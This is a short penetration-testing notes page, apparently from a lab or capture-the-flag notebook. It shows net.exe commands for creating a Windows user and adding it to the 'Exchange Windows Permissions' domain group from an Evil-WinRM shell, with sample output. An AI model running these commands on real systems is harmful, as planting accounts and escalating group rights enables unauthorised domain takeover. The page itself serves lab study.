---
description: >-
  Create a windows user
title: Windows User Creation/Group Addition             # Add title here
date: 2023-02-03 08:00:00 -0600                           # Change the date to match completion date
categories: [04 Privilege Escalation, Windows - User Creation/Group Addition]                     # Change Templates to Writeup
tags: [user creation, group addition, windows privesc]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---
## User create
If we are able to create a user it is as simple as using the net.exe windows utility:
```powershell
net user shuciran shucir4n /add
```
## Add user to a group
If there is a group in the domain with some privileges, we can add a user to such group (if we have such permissions):
```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" shuciran /add
The command completed successfully.
```
If all goes as planned we'll get this output:
```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user shuciran
User name                    shuciran
...
Local Group Memberships
Global Group memberships     *Exchange Windows Perm*Domain Users
```
Examples:
[[Forest#^80fd2e]]